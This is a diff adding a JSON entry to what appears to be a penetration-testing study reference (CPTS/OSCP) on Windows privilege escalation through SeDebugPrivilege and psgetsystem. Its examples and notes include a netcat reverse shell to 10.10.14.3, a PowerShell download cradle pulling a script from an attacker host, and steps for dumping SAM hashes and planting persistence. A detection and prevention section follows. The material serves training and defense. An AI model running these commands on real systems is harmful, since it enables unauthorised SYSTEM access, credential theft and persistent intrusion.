@@ -1,0 +1,85 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "sedebug",
+    "system",
+    "token"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Token Privileges",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Find a SYSTEM-owned PID (lsass)",
+      "command": "tasklist\nGet-Process lsass"
+    },
+    {
+      "label": "Spawn your command as a child of that PID",
+      "command": "[MyProcess]::CreateProcessFromParent(<lsass_pid>,c:\\tools\\nc.exe -e cmd.exe 10.10.14.3 443,\"\")"
+    }
+  ],
+  "notes": "=== SeDebugPrivilege — psgetsystem (Parent Process Token Theft) ===\nSpawn a SYSTEM child process by inheriting a SYSTEM parent's token — no credential dumping needed.\n\n=== WHEN TO USE THIS OVER LSASS DUMP ===\nNo interactive users logged in → no useful credentials in LSASS\nCredentials already known → just need SYSTEM shell for next step\nRunAsPPL=1 on LSASS → can't dump LSASS, but can steal another SYSTEM process token\nNon-interactive context (web shell, reverse shell) → need SYSTEM execution not credentials\n\n=== ATTACK FLOW ===\n1. Confirm SeDebugPrivilege (elevated session)\n2. Find a SYSTEM process PID:\n   tasklist | findstr lsass\n   Get-Process winlogon | Select-Object Id\n3. Load the script:\n   Import-Module .\\psgetsys.ps1\n4. Execute:\n   [MyProcess]::CreateProcessFromParent(<SYSTEM_PID>, \"cmd.exe\", \"\")\n   Third argument \"\" is required by the PoC — do not omit\n\n=== FOR NON-INTERACTIVE CONTEXTS ===\nReplace \"cmd.exe\" with reverse shell binary path:\n[MyProcess]::CreateProcessFromParent(<PID>, \"C:\\ProgramData\\shell.exe\", \"\")\nOr PowerShell download cradle:\n[MyProcess]::CreateProcessFromParent(<PID>, \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\", \"\")\n\n=== CHAINING CONTEXT ===\nSeDebugPrivilege → psgetsystem → SYSTEM → add local admin → persistent RDP access\nSYSTEM shell → reg save HKLM\\SAM + HKLM\\SYSTEM → secretsdump offline → local hash crack\nDeveloper account with RDP + SeDebugPrivilege (common in dev environments) → reliable SYSTEM\nSYSTEM shell → deploy persistence → maintain access after password changes\n\n=== WHAT TO LOOK FOR ===\nSeDebugPrivilege in GPO on non-admin dev accounts = critical finding\nAssigned via: Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment\nAny account with SeDebugPrivilege = direct SYSTEM path via psgetsystem\nCombine with LSASS path for dual-approach: credentials + SYSTEM shell simultaneously",
+  "references": [
+    {
+      "title": "psgetsystem (decoder-it)",
+      "url": "https://github.com/decoder-it/psgetsystem"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sedebug-lsass-dump",
+      "note": "Same privilege used to dump creds instead.",
+      "rel": "alternative"
+    },
+    {
+      "id": "winpe-user-group-enum",
+      "note": "Confirms SeDebugPrivilege is held.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "sedebug-psgetsystem",
+  "name": "SeDebugPrivilege - psgetsystem Parent Process",
+  "command": "[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,\"\")",
+  "description": "Using SeDebugPrivilege, psgetsys.ps1 spawns a child process from a SYSTEM-owned parent (e.g. an lsass/winlogon PID from tasklist), inheriting a SYSTEM token to run a command.",
+  "opsec": "loud",
+  "mitre": [
+    "T1134.002"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "psgetsys.ps1 exploits SeDebugPrivilege by calling CreateProcessFromParent to spawn a new process inheriting the token of a target SYSTEM process (e.g., winlogon.exe). Since SeDebugPrivilege allows opening any process, the new process inherits the SYSTEM token without requiring any vulnerability — it is a direct privilege abuse via process token inheritance.",
+    "prerequisites": "SeDebugPrivilege in current token (local administrator). psgetsys.ps1 script. A target SYSTEM process PID to borrow the token from.",
+    "impact": "Instant SYSTEM shell with full privileges by inheriting any SYSTEM process token. No CVE or patch required — pure privilege abuse.",
+    "detection": "psgetsys.ps1 import and execution (PowerShell Script Block Logging). CreateProcessFromParent API call by non-SYSTEM process. Sysmon Event 1: child process of winlogon.exe created by unexpected parent. SYSTEM process spawned from unexpected user context.",
+    "artifacts": "PowerShell transcript: psgetsys.ps1 imported | Sysmon Event 1: process created with unexpected parent PID | Process list: cmd.exe or PowerShell running as SYSTEM with winlogon.exe as parent",
+    "prevention": "Restrict SeDebugPrivilege: in high-security environments, remove from local Administrators via GPO. Enable PowerShell Script Block Logging and Module Logging. Deploy Sysmon with parent-child process anomaly detection. Use JEA (Just Enough Administration) instead of granting full admin rights.",
+    "misconfiguration": "Full local administrator rights granted broadly — includes SeDebugPrivilege by default. No PowerShell logging. No Sysmon to detect parent-process spoofing.",
+    "vulnerable_config": "# psgetsys creates SYSTEM process:\nImport-Module .\\psgetsys.ps1\n# Target PID 612 = winlogon.exe (SYSTEM)\n[MyProcess]::CreateProcessFromParent(612, 'cmd.exe', '')\n# Returns cmd.exe running as SYSTEM",
+    "secure_config": "# Restrict SeDebugPrivilege via GPO:\n# Computer Configuration > Windows Settings > Security Settings > Local Policies\n# > User Rights Assignment > Debug programs\n# Remove Administrators, add only specific accounts if needed\n\n# PowerShell logging:\nSet-ItemProperty HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging -Name EnableModuleLogging -Value 1\n\n# Sysmon rule: alert on winlogon.exe spawning unexpected children",
+    "sources": [
+      "HTB M26",
+      "MITRE T1134.002"
+    ]
+  }
+}
